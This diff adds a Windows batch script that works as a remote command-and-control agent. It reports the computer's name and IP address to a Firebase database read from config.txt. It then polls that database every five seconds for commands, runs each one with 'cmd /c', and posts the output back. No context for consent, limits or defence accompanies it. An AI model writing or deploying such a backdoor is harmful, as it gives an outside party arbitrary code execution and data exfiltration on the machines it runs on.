@@ -1,0 +1,87 @@
+@echo off
+setlocal enabledelayedexpansion
+
+:: Configuration
+:: Read FIREBASE_URL from config.txt
+set FIREBASE_URL=
+for /f "usebackq delims=" %%a in ("config.txt") do set "FIREBASE_URL=%%a"
+set CLIENT_PATH=/clients/%COMPUTERNAME%
+set COMMAND_PATH=/commands/%COMPUTERNAME%
+
+:: Initialize files
+if exist output.txt del output.txt
+if exist current_command.txt del current_command.txt
+:: empty the cd_command.txt if it exists
+if exist cd_command.txt del cd_command.txt
+
+:: Get IP Address
+for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr "IPv4"') do (
+    for /f "tokens=* delims= " %%b in ("%%a") do set IP_ADDRESS=%%b
+)
+
+:: Send IP to Firebase
+echo [%TIME%] Sending IP address to Firebase...
+curl -X PATCH -d "{\"ip\":\"%IP_ADDRESS%\", \"last_online\":\"%DATE% %TIME%\"}" "%FIREBASE_URL%%CLIENT_PATH%.json"
+
+:: Command processing loop
+:loop
+echo [%TIME%] Checking for commands...
+curl -s "%FIREBASE_URL%%COMMAND_PATH%/command.json" > current_command.txt
+
+set CURRENT_COMMAND=
+for /f "usebackq delims=" %%a in ("current_command.txt") do set "CURRENT_COMMAND=%%a"
+
+:: Remove surrounding quotes if present
+set CURRENT_COMMAND=!CURRENT_COMMAND:"=!
+
+if "!CURRENT_COMMAND!" neq "null" (
+    if "!CURRENT_COMMAND!" neq "" (
+        if "!CURRENT_COMMAND!" neq "{"error":"404 Not Found"}" (
+            :: if cd_command.txt exists, and not empty, run all the commands in it
+            if exist cd_command.txt (
+                set "ALL_COMMANDS="
+                for /f "usebackq delims=" %%c in ("cd_command.txt") do (
+                    set "ALL_COMMANDS=!ALL_COMMANDS!%%c & "
+                )
+                set "ALL_COMMANDS=!ALL_COMMANDS!!CURRENT_COMMAND!"
+                echo [%TIME%] Executing combined commands: !ALL_COMMANDS!
+                cmd /c "!ALL_COMMANDS!" > output.txt 2>&1
+                if /i "!CURRENT_COMMAND:~0,2!"=="cd" (
+                    echo !CURRENT_COMMAND! >> cd_command.txt
+                )
+            ) else (
+                echo [%TIME%] Executing: !CURRENT_COMMAND!
+                if /i "!CURRENT_COMMAND:~0,2!"=="cd" (
+                    echo !CURRENT_COMMAND! >> cd_command.txt
+                ) else (
+                    cmd /c "!CURRENT_COMMAND!" >> output.txt 2>&1
+                )
+            )
+            
+            :: Process output for JSON
+            set "JSON_OUTPUT="
+            for /f "delims=" %%a in ('type output.txt') do (
+                set "line=%%a"
+                :: Escape special characters
+                set "line=!line:\=\\!"
+                set "line=!line:"=\"!"
+                set "line=!line:/=\/!"
+                set "JSON_OUTPUT=!JSON_OUTPUT!!line!\n"
+            )
+            
+            :: Remove trailing newline
+            if defined JSON_OUTPUT set "JSON_OUTPUT=!JSON_OUTPUT:~0,-2!"
+            
+            :: Send output to Firebase
+            echo [%TIME%] Sending results to Firebase...
+            curl -X PATCH -d "{\"output\":\"!JSON_OUTPUT!\", \"status\":\"completed\", \"timestamp\":\"%DATE% %TIME%\"}" "%FIREBASE_URL%%COMMAND_PATH%.json"
+            
+            :: Clear the command
+            echo [%TIME%] Clearing command...
+            curl -X PATCH -d "{\"command\":null}" "%FIREBASE_URL%%COMMAND_PATH%.json"
+        )
+    )
+)
+
+timeout /t 5 /nobreak >nul
+goto loop
